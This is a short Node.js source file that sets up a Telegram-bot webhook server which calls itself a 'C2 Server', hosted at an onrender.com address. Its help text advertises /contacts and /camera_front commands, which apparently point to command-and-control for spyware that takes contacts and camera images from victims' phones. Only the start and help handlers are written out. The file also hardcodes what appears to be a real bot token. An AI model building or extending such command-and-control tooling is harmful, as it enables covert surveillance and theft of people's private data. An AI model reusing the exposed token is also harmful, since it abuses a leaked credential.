const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = '8543353831:AAEDJTsyRlApiIYc2oCMEkc8QHrZrD9_UgM'; // التوكن الجديد
const SERVER_URL = 'https://c2-server-ufyp.onrender.com';

const app = express();
app.use(express.json());

// نقطة استقبال Webhook
app.post(`/webhook/${BOT_TOKEN}`, (req, res) => {
    const bot = new TelegramBot(BOT_TOKEN);
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

app.get('/', (req, res) => res.send('C2 Server Active'));

// تهيئة البوت بدون Polling
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, '✅ البوت يعمل عبر Webhook! أرسل /help');
});
bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, '📱 الأوامر: /start, /help, /contacts, /camera_front ...');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
    console.log(`✅ Server on port ${PORT}`);
    const botSetup = new TelegramBot(BOT_TOKEN);
    await botSetup.deleteWebhook();
    await botSetup.setWebHook(`${SERVER_URL}/webhook/${BOT_TOKEN}`);
    console.log('✅ Webhook set');
});
